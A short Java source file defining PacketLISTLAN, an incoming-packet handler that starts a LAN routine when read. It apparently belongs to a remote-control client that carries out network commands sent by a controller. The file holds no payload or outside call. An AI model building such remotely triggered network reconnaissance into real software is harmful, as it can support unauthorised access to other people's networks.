package com.redpois0n.packets.in;

import com.redpois0n.Lan;

public class PacketLISTLAN extends AbstractIncomingPacket {

	@Override
	public void read() throws Exception {
		new Lan().start();
	}

}
